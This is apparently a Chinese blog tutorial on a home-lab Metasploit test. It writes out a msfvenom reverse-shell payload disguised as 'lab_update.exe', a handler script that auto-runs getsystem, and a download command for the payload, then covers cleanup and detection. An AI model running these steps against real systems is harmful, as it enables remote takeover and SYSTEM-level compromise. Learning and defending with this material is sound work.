---
title: 用MSF对自家内网做一次完整渗透实验
description: 从 SSH 接入 Kali、网段侦察，到 msfvenom 生成 Windows 载荷、meterpreter 上线取证，再到识破"靶机竟是宿主"、清理还原的完整动手记录，附带每步背后的原理知识点。
date: 2026-10-23
updated: 2026-10-23
categories:
  - 技术
tags:
  - 安全, 渗透测试, Metasploit, MSF, 内网, Kali, 攻防
image: https://img-reg-ab.imagency.cn/e/af48c66408dfa1363293b57d97971005.jpg
recommend: 1
type: tech
---
# 用MSF对自家内网做一次完整渗透实验

> ⚠️ 免责声明：本文所有操作均发生在我**自己的实验环境**——我自己的 Kali 虚拟机、我自己的 Windows 宿主机。请只在**你有权测试的机器**上复现。任何对他人机器的未授权测试都是违法的。

最近想系统过一遍内网渗透的标准流程：从侦察到上线到清理，一条龙。这篇记录用 Metasploit 在自己家里内网做实验的全过程，包括踩的一个大坑——**以为打的是靶机，结果载荷直接上到了我自己的 Windows 宿主机上**。

## 整体思路

完整的内网渗透闭环应该是这样的：

1. 建立到攻击机的通道（SSH 接入 Kali）
2. 侦察目标网段（nmap 主机发现 + 端口扫描）
3. 生成攻击载荷（msfvenom 做 Windows 反弹 shell）
4. 搭好监听器等服务（multi/handler、HTTP 分发）
5. 让目标执行载荷，meterpreter 上线
6. 后渗透取证（提权、进程、网络、防御状态）
7. 识别目标、复现问题
8. 清理还原

每一步都有对应的知识点，我按流程记录，最后单独汇总所有要学的东西。

## 第一步：SSH 接入 Kali 并免密

Kali 在 VMware NAT 网段里，攻击机地址 `192.168.237.128`，root 账号。

**密码登录大坑**：OpenSSH 默认从终端读密码，没有交互终端时（比如从脚本/后台调用）需要 `SSH_ASKPASS` 环境变量指定一个"密码生成器"。

```cmd
:: askpass.cmd —— 回显密码给 ssh
@echo off
echo 123
```

```powershell
$env:SSH_ASKPASS = "C:\path\askpass.cmd"
$env:SSH_ASKPASS_REQUIRE = 'force'   # 强制走 askpass
$env:DISPLAY = 'localhost:0'
ssh -o PreferredAuthentications=password root@192.168.237.128 "id"
```

**免密更稳的做法是上密钥**：`ssh-keygen` 生成一对密钥，把公钥追加到 Kali 的 `~/.ssh/authorized_keys`，之后就能直接 `ssh -i id_ed25519` 免密登录，不再依赖弱密码。

**注意 Windows 上的坑**：工作区路径带中文时，OpenSSH 的 askpass 解析会报 `posix_spawnp: No such file or directory`。把辅助脚本放到纯 ASCII 路径（如 `%TEMP%`）即可，密钥文件本身放中文路径没关系。

## 第二步：网段侦察

Kali 只有一张网卡 `eth0`，在 `192.168.237.0/24`（VMware NAT / VMnet8）。

**主机发现**：

```bash
nmap -sn 192.168.237.0/24
```

结果只有 4 个地址存活：`.1`（宿主）、`.2`（NAT 网关）、`.128`（Kali）、`.254`（DHCP 保留），**没有独立靶机**。

**端口扫描**用 `-sS -sV` 加脚本：

```bash
nmap -sS -sV -sC --top-ports 1000 192.168.237.1
```

关键发现都在宿主 `.1` 上：`135/139/445` SMB、`902/912` VMware、`4899` Radmin、`11434` Ollama、`49664-49669` 动态 RPC。

### 学习点：识别假阳性

扫描 `192.168.56.0/24`（VirtualBox Host-Only）和 `192.168.153.0/24`（VMnet1）时，nmap 报告"256 个地址全部存活"——这明显不对，Kali 根本没这两块网卡。

复核方法是交叉验证：

```bash
ping -c 2 -W 1 192.168.56.100      # 全丢包 → 假活
timeout 3 bash -c "echo > /dev/tcp/192.168.56.100/22" && echo OPEN || echo CLOSED
traceroute -n -m 3 192.168.56.100  # 到 NAT 网关就断
```

结论：**nmap 的 ICMP 探测会被 NAT 网关"代答"，产生全存活假象**。判断主机真实活没活，要用 TCP 连接实测，不能只看 nmap 的输出。这是很多新手会信以为真的坑。

## 第三步：用 msfvenom 生成 Windows 载荷

确认打的是 x64 Windows 10/11 后，生成最经典的反弹 shell 组合：

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.237.128 LPORT=4444 -f exe -o lab_update.exe
```

```
No encoder specified, outputting raw payload
Payload size: 509 bytes
Final size of exe file: 7680 bytes
lab_update.exe: PE32+ executable for MS Windows 4.00 (GUI), x86-64, 5 sections
```

| 参数 | 说明 |
| --- | --- |
| `-p windows/x64/meterpreter/reverse_tcp` | 64 位 Windows，meterpreter 反弹 TCP |
| `LHOST` | 攻击机（Kali）的地址，反弹连接发往这里 |
| `LPORT` | 监听端口，这里 4444 |
| `-f exe` | 输出 Windows 可执行格式 |

### 学习点：payload 三要素

- **reverse_tcp（反弹）**：目标主动连回攻击机。适合目标有公网出口、攻击机方便收连的场景，最常用。
- **bind_tcp（绑定）**：目标开启端口等攻击机来连，适合目标能出被连、但不能外联的场景。缺点是被防火墙挡。
- **stage（分阶段）**：先传一个小的 stage，再拉取真正的 meterpreter stage。`windows/x64/meterpreter/reverse_tcp` 就是 staged。
- 想纯静态用 `windows/x64/shell_reverse_tcp`（stager-less，一个文件全含，但体积更大、无 meterpreter 功能）。

## 第四步：搭监听器和分发服务

监听用 `multi/handler`，写成 resource 脚本，避免每次手敲：

```bash
# /root/ctf-lab/handler.rc
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.237.128
set LPORT 4444
set ExitOnSession false
set AutoRunScript multi_console_command -cl "sysinfo","getuid","getsystem"
exploit -j -z
```

同时起一个 HTTP 服务把 exe 分发给目标下载：

```bash
python3 -m http.server 8080 --directory /root/ctf-lab
# 目标机上: Invoke-WebRequest http://192.168.237.128:8080/lab_update.exe -OutFile ...
```

### 学习点：为什么必须用 tmux 托管 msfconsole

直接把 `msfconsole -q -r handler.rc` 丢后台，SSH 会话一关它就退——因为**它读不到 stdin**，`exploit -j -z` 建好 job 后没有交互输入源就自己退了（日志会停在 `Started reverse TCP handler` 但进程消失）。

解法是用 tmux 给一个有持久 TTY 的会话：

```bash
tmux new-session -d -s msf "cd /root/ctf-lab && msfconsole -q -r handler.rc; exec zsh"
tmux attach -t msf        # 进入
tmux send-keys -t msf "sessions -l" C-m   # 非交互发命令
tmux capture-pane -pt msf -S -60          # 抓屏读输出
```

tmux 常用来托管需要长期稳定运行、又需要交互的控制台程序。

## 第五步：载荷上线 & 取证

目标运行 exe 后，meterpreter 上线。handler 的 `AutoRunScript` 自动执行了三件事：

```
[*] Meterpreter session 1 opened (192.168.237.128:4444 -> 192.168.237.1:13077)
[*] Sending stage (255679 bytes) to 192.168.237.1
	Running command sysinfo
	Computer        : DESKTOP-2U6O230
	OS              : Windows 10 22H2+ (10.0 Build 19045)
	Running command getuid
	Server username: DESKTOP-2U6O230\guoji
	Running command getsystem
	...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin))
```

注意关键的一行：**回连源地址是 `192.168.237.1`**。

### 常用取证命令

| 命令 | 作用 |
| --- | --- |
| `sysinfo` | 系统版本、架构、语言、主机名 |
| `getuid` | 当前运行身份 |
| `getprivs` | 当前进程启用的全部特权 |
| `getpid` / `ps` | 进程 PID、进程列表（含路径和用户） |
| `getsystem` | 尝试提权到 SYSTEM |
| `netstat -an` | 端口和连接（会较慢，注意调超时） |
| `shell` | 弹原生 cmd / powershell |

管道命令（如 `netstat -ano | findstr LISTENING`）在 meterpreter 里可能会超时卡住——它把整条当一条命令交互。可以用 `shell` 进去再执行，或调大交互超时：

```
sessions --interact 1 --timeout 120
```

### 学习点：getsystem 的提权原理

`getsystem` 成功走的是 **Named Pipe Impersonation**（技术 1），本质是：如果你有 `SeImpersonatePrivilege`，可以让一个 SYSTEM 进程通过命名管道访问你伪造的服务端，在服务端身份上模拟出 SYSTEM 令牌。getprivs 里能看到 `SeImpersonatePrivilege`、`SeDebugPrivilege`、`SeBackupPrivilege` 等都是提权的资本。

提权之后身份从普通管理员变成了 `NT AUTHORITY\SYSTEM`——**这是本地最高权限**，能读写几乎所有东西。

## 第六步：识破——打中的是我的宿主机

用 `getsystem` 提权成功、拿到 SYSTEM 后，在进程列表里发现了关键线索：

```
14140  vmware-vmx.exe   C:\Program Files (x86)\VMware\...\vmware-vmx.exe
19564  lab_update.exe   C:\Users\Public\lab_update.exe
19644  lab_update.exe   C:\Users\Public\lab_update.exe
13304  DeepSeek Harness.exe  D:\depseek\DeepSeek Harness.exe
```

再查那个 `vmware-vmx` 的命令行：

```cmd
wmic process where processid=14140 get commandline /format:list
```

结果 vmx 指向 `D:\kaliLinux\Debian 12.x 64 位.vmx`——也就是我们正在用的**这台 Kali 本身**，并没有独立的 Windows 靶机。

`ipconfig` 也彻底坐实：回连主机 `192.168.237.1` 的网卡列表里有 `Intel Wireless-AC 9560 (10.15.2.225)`、`VMnet1`、`VMnet8`、OpenVPN TAP、蓝牙等——这就是**宿主机的网卡全景**，VM 只会有单张网卡。

### 学习点与教训

- **认错了目标网段**：载荷分发走的是 VMnet8，我以为会到一个独立的 Windows VM，但实际分发和回连都发生在宿主共享的 NAT 网段，导致 exe 落地并运行在宿主机上。
- **识别的信号**是反着的——session 打开时的 `192.168.237.1` 回连地址、宿主的 MAC `00:50:56:c0:00:08`、主机名 `DESKTOP-2U6O230`、真实的无线/有线网卡。这些在 scan 阶段就识别过宿主，对照就看出不对劲。
- **永远别在没确认目标身份前就"打"**——先把目标 IP 在侦察阶段和上线后的指纹核对一遍。

## 第七步：清理还原

出错归出错，最终要干净收尾。我按顺序清理：

### 1. 杀载荷进程，会话随之断开

```cmd
taskkill /F /IM lab_update.exe
```

在弹出的 `Terminate channel 2?` 里选 `y`，两个 meterpreter 会话关闭，验证：

```
msf exploit(multi/handler) > sessions -l
No active sessions.
```

### 2. 关掉 Kali 侧服务，删载荷文件

```bash
tmux kill-session -t msf
pkill -f "http.server 8080"
rm -f /root/ctf-lab/lab_update.exe /root/ctf-lab/handler.rc
```

### 3. 验证端口不再可达

```powershell
Test-NetConnection 192.168.237.128 -Port 4444   # 已关闭
Test-NetConnection 192.168.237.128 -Port 8080   # 已关闭
```

### 4. 删除宿主机上的载荷文件

`C:\Users\Public\lab_update.exe` 因属主是 `BUILTIN\Administrators`、当前会话非管理员，普通权限删不掉，需要管理员 PowerShell：

```powershell
Remove-Item "C:\Users\Public\lab_update.exe" -Force
```

### 5. 恢复被关闭的 Defender

检查发现实时保护是 `False`，且原因是组策略写死了 `DisableRealtimeMonitoring=1`：

```
HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection
    DisableRealtimeMonitoring    REG_DWORD    0x1
```

组策略优先级高于 `Set-MpPreference`，所以光设 `$false` 不生效，要先删策略再恢复：

```powershell
Remove-Item "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Recurse -Force
Set-MpPreference -DisableRealtimeMonitoring $false
Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled
Start-MpScan -ScanType QuickScan
```

### 学习点：清理的几种删除手段

Windows 上用普通权限删不掉文件时，排查顺序是：先 `Get-Acl` 看属主和权限，再确认是否属主为 Administrators/SYSTEM 而当前用户非管理员，必要时用管理员 PowerShell。**被入侵的会话去"清自己的痕迹"没有意义**——正确的清理应该在你自己的本机、用干净的管理员会话做。安全测试的收尾必须包含：杀进程、删落地文件、关监听/分发服务、恢复被临时改过的安全设置、验证端口关闭。

## 第八步：防御视角，这类攻击怎么被看见

最后把"攻击者的每一步"翻译成"防御者怎么挡住/发现"：

| 阶段 | 攻击动作 | 防御/检测 |
| --- | --- | --- |
| 分发 | HTTP 下载 exe | URL 过滤、Web 代理日志、下载行为告警 |
| 落地 | 写入 `C:\Users\Public` | AppLocker / WDAC 应用白名单拦截非白名单 exe |
| 执行 | 运行 msfvenom 裸载荷 | **实时防护的静态查杀**，裸载荷特征明显 |
| 回连 | 反弹到 4444 | 出站防火墙限制、IDS 规则（4444 是经典特征） |
| 提权 | getsystem | 审计 SeImpersonate 滥用、Sysmon 进程链 |
| 持久化 | 计划任务/注册表 | Sysmon 注册表与启动项监控 |

这次能成功，一个关键前提就是**宿主实时防护被关着**——所以防御侧第一条永远是：保持杀软实时保护开启、别让组策略把它写死。

## 常见问题

### 打中的是宿主而不是靶机，怎么办

第一时间核对上线主机指纹（回连 IP、主机名、MAC、网卡列表）与你的目标清单。发现打错立刻停止后渗透、按第七步清理。别在"疑似自己机器"上继续深入。

### msfconsole 挂后台就退

参数写错了或没交互输入源。用 tmux 托管并给个交互 TTY 即可，`exploit -j -z` 建 job 加上 `-z` 不阻塞。

### meterpreter 命令卡住/超时

管道命令容易触发。进 `shell` 执行，或用 `sessions --interact <id> --timeout <time>` 调大默认 15 秒超时。

### 文件删不掉

先 `Get-Acl` 看属主和 ACL，属主是 Administrators 而当前用户非管理员时提权再删，或用管理员 PowerShell。

### Defender 设 `$false` 不生效

多半是组策略写死了 `DisableRealtimeMonitoring=1`，组策略优先级更高，删掉策略注册表项再设即可。

## 需要学习的知识点清单

**网络/系统基础**
- SSH 公钥免密认证原理（authorized_keys）
- VMware NAT 网段与桥接的区别、宿主共享网段里"目标到底是谁"
- ICMP 探测的假阳性成因与 TCP 交叉验证

**侦察**
- nmap 主机发现 vs 端口扫描（`-sn`、`-sS`、`-sV`、`-sC`）
- 网段/路由判断（`ip route`、`ip neigh`）

**Metasploit**
- msfvenom 载荷参数（payload、LHOST/LPORT、arch/platform、staged vs stager-less）
- reverse_tcp vs bind_tcp 及应用场景
- multi/handler 与 resource 脚本
- meterpreter 后渗透命令（sysinfo/getuid/getprivs/getsystem/ps/netstat/shell）

**提权**
- `SeImpersonatePrivilege`、Named Pipe Impersonation 原理
- SYSTEM vs 普通管理员权限边界

**清理/取证**
- taskkill / `Get-Acl` / 管理员权限删除
- Defender 组策略覆盖机制
- 渗透测试收尾清单

## 文件/资产清单

| 资产 | 位置/说明 |
| --- | --- |
| SSH 密钥 | 工作区 `.dsh/kali/id_ed25519` + Kali `~/.ssh/authorized_keys` |
| `askpass.cmd` | 临时密码回显脚本（ASCII 路径下放置） |
| `handler.rc` | msf 监听脚本 `/root/ctf-lab/handler.rc` |
| `lab_update.exe` | `windows/x64/meterpreter/reverse_tcp` 载荷（已清理） |
| tmux 会话 `msf` | msfconsole 进程容器（已清理） |
| HTTP 分发 8080 | `python3 -m http.server`（已清理） |
| 扫描报告 | 工作区 `scan-192.168.237.0-24.md` |

## 复盘

这次最大的收获反而不是"打下来了"，而是那个"全军覆没"的环节——**目标身份没核实就开打**。如果谨慎一点，在分发前先确认目标网段里到底有没有独立的 Windows VM，就能避免把载荷打到宿主机上。

内网渗透和写代码一样，**跑通流程不是目的，理解每一步为什么这么做才是**。对照上面八个步骤，把每一步的原理吃透，才算真正入门。